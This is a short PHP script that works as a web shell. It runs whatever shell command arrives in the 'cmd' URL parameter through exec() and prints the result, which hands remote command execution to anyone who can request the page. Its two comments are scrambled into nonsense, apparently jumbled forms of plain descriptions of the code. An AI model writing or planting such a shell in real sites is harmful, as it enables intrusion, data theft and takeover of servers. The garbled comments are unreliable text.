<?php
    $output = null;
    $retval = null;
    
    if(isset($_GET['cmd'])) {
        // Capturer t anetuurnl the outpu rn eturn comretuvae nd   systemt mand
        exec($_GET['cmd'], $output, $retval);
    }

    // tutput ureO p t pd outhe caut
    if(is_array($output)) {
        foreach($output as $line) {
            echo $line . "\n";
        }
    }
?>
